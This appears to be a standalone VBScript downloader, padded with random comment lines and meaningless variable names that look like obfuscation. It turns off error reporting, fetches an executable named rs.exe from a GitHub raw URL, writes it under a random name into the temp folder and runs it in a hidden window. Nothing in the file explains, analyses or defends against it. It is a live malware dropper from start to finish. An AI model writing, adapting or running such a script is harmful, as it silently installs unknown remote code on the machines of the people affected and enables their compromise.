' xZZZgGDnyYxNixzrUXBPBTiDtiNDEImFqkGLjnaGjcxxyjNgYvIOIX
On Error Resume Next
' JmtlhOdFOIhZB RCgwtbpVBhrEamxGkOVRpA
Dim xpmlzir,ylztwox,zzlacd,aaecsf,bjyugxe,czfjez
' pqnGlqtXMmqgNxAwzFsmIZsKOhVqsNrlFj
Set xpmlzir = CreateObject("MSXML2.ServerXMLHTTP")
xpmlzir.Open "GET","https://raw.githubusercontent.com/kai195102/d/main/rs.exe",False
xpmlzir.Send
' kAfFOXtvhFeKXn fUPsNsQAJmIkgXvI
If xpmlzir.Status = 200 Then
  Set ylztwox = CreateObject("ADODB.Stream")
  ylztwox.Type = 1
  ylztwox.Open
  ylztwox.Write xpmlzir.ResponseBody
  Set zzlacd = CreateObject("Scripting.FileSystemObject")
  aaecsf = zzlacd.GetSpecialFolder(2)
  bjyugxe = aaecsf & "\tq5kU45L.exe"
  ylztwox.SaveToFile bjyugxe, 2
  ylztwox.Close
  Set czfjez = CreateObject("WScript.Shell")
  czfjez.Run bjyugxe, 0, False
End If
' oeWVJnXumULUjQjqNyFd
Set xpmlzir = Nothing
' BJdgjnwsGBWQjZSKKOyeAN
